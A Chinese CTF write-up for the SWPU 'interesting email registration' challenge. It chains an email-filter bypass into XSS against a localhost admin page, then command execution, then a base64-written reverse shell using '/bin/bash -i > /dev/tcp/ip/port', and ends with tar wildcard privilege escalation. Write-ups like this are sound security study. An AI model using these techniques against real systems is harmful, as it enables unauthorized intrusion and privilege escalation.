> 原文链接: https://www.anquanke.com//post/id/168199 


# swpu ctf 有趣的邮箱注册 详细题解


                                阅读量   
                                **237098**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t0190f15ca83aebe069.gif)](https://p3.ssl.qhimg.com/t0190f15ca83aebe069.gif)

> 不得不说，swpu的师傅们出题还是很用心的，这道题目就很不错，既有前端xss，又有后端提权，可谓是非常全面了，下面我们就简单分析一下

题目地址为: [http://118.89.56.208:6324](http://118.89.56.208:6324)

## 邮箱验证

首先打开题目，发现功能只有两个，一个是验证邮箱，另一个是管理后台，但是管理后台需要本地，那突破点就在邮箱验证了。

[![](https://p3.ssl.qhimg.com/t01af3d7e2a45d185a8.png)](https://p3.ssl.qhimg.com/t01af3d7e2a45d185a8.png)

尝试提交邮箱，发现了代码泄露，给出了过滤方式：

[![](https://p3.ssl.qhimg.com/t0186721a5e659e1de6.png)](https://p3.ssl.qhimg.com/t0186721a5e659e1de6.png)

于是开始尝试在email处尝试xss，经过google，发现了几种绕过，尝试了一下，发现只要使用`"poc"[@qq](https://github.com/qq).com`类似的方法，就可以绕过过滤，然后构造xss的payload如下：

[![](https://p4.ssl.qhimg.com/t014b1b09ffb9e6df54.png)](https://p4.ssl.qhimg.com/t014b1b09ffb9e6df54.png)

可以收到请求.

[![](https://p5.ssl.qhimg.com/t01b413fa044a1af410.png)](https://p5.ssl.qhimg.com/t01b413fa044a1af410.png)



## 攻击local web

既然有了xss，我们首先读一下admin页面源码：

js构造如下：

[![](https://p0.ssl.qhimg.com/t01b620c50eea5468fa.png)](https://p0.ssl.qhimg.com/t01b620c50eea5468fa.png)

然后收到请求，解码如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e0bd456ffd190c2f.png)

在页面中，发现了疑似命令执行的页面，尝试构造请求：

[![](https://p0.ssl.qhimg.com/t01b6b4f9745516fced.png)](https://p0.ssl.qhimg.com/t01b6b4f9745516fced.png)

很快收到了结果：

[![](https://p4.ssl.qhimg.com/t01f6e455b694fc37e3.png)](https://p4.ssl.qhimg.com/t01f6e455b694fc37e3.png)

但是一直这么请求，执行命令很麻烦，不如反弹个shell



## 反弹shell

这里直接用命令弹shell是很难成功的，因为有多重编码要考虑，因此采用写sh文件，然后执行sh文件弹shell的办法：

首先使用的写文件的技巧就是，base64

```
echo 'bHM=' | base64 -d &gt; /tmp/xjb.sh
```

这个办法能很好的绕过很多编码，同理我们只要将`/bin/bash  -i &gt; /dev/tcp/ip/port 0&lt;&amp;1 2&gt;&amp;1`编码一下，然后放到上面的命令中，就可以成功将反弹shell的命令写入到文件中。

然后执行：

```
/bin/bash /tmp/xjb.sh
```

就可以成功弹到shell。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01119dd181e5072b0e.png)



## flag读取不了？

我们查看了一下flag，发现我们并没有办法读取，没有权限，只有flag用户才能读。

继续翻发现了一个新目录：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t010a222b74e97ae33c.png)

进入以后，发现了一个新的web应用，看下权限：

[![](https://p3.ssl.qhimg.com/t01b2ac37718e0b8da9.png)](https://p3.ssl.qhimg.com/t01b2ac37718e0b8da9.png)

只有backup.php 可以看，代码如下：

[![](https://p3.ssl.qhimg.com/t013f54ac8fe051036e.png)](https://p3.ssl.qhimg.com/t013f54ac8fe051036e.png)

访问目录发现有上传和备份的功能，备份代码给出了。



## 分析思路

既然现在我们没有办法直接读取flag，那就只能让flag用户或者高权限用户帮我们读了，看了看这个tar命令，总觉得不对，在搜索中发现利用tar来提权执行脚本的操作，具体文章戳[这里](https://blog.csdn.net/qq_27446553/article/details/80943097).

正如文章中讲到，使用tar命令可以配合执行自定义脚本，那这个看似没有可控点的命令执行，就变得可以利用了：

[![](https://p0.ssl.qhimg.com/t0184155c4c2f4b032c.png)](https://p0.ssl.qhimg.com/t0184155c4c2f4b032c.png)

攻击思路整理如下：

[![](https://p0.ssl.qhimg.com/t01c9641d10bb8a6ce9.png)](https://p0.ssl.qhimg.com/t01c9641d10bb8a6ce9.png)



#### <a class="reference-link" name="%E5%88%B6%E4%BD%9C%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6"></a>制作上传恶意文件

使用文章中的命令，制作恶意文件名的文件：

[![](https://p5.ssl.qhimg.com/t01ccacea3cd5f08039.png)](https://p5.ssl.qhimg.com/t01ccacea3cd5f08039.png)

其中1.sh 的内容是：

[![](https://p2.ssl.qhimg.com/t01bc2f3fd900468b2c.png)](https://p2.ssl.qhimg.com/t01bc2f3fd900468b2c.png)



## 备份触发bash脚本，获取flag

只要访问backup.php ，即可成功触发漏洞，获取flag

[![](https://p5.ssl.qhimg.com/t013c7828b348cb8f07.png)](https://p5.ssl.qhimg.com/t013c7828b348cb8f07.png)

[![](https://p2.ssl.qhimg.com/t01130d1fb4fc4c15b9.png)](https://p2.ssl.qhimg.com/t01130d1fb4fc4c15b9.png)



## 后记

题目做完，思路可以总结为 bypass FILTER_VALIDATE_EMAIL然后xss，攻击只有本地才能访问的local web应用，从而拿到机器shell，然后继续攻击内网web题目，使用tar提权查看flag，确实学到了不少东西，如果有别的思路可以同样交流探讨。
